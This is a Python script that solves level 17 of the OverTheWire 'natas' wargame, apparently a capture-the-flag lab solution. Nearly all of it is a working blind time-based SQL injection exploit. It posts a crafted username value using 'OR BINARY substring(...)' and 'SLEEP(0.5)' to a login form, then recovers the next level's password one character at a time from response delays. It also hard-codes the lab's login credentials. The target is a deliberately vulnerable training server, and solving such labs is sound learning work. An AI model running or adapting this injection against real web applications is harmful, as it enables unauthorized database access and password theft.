# Python script for natas 17
# Goes through 32 characters that are either ASCII characters (capital and minor) and numerals 0-9
# Finds out if a char returns a true value and adds it into the known password
# Returns password for level 18.

import string
import requests
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
characters = string.ascii_letters+string.digits
password = ""
count = 1

while True:
    found = False
    for  char in characters:
        payload= "username=" + "\" OR BINARY " \
            "substring((SELECT password FROM users WHERE username=\"natas18\"),1,"+str(count)+")"\
            " = \""+password+char+"\""+" AND SLEEP(0.5) -- "

        response = requests.post(url, data=payload, auth=auth,headers=headers)
        print(payload, response.elapsed.total_seconds())

        print(payload,response.elapsed)
        if response.elapsed.total_seconds()>0.37:
            found = True
            password+=char
            count = count+1
            print("success")
            break
    if not found:
        break

print(password)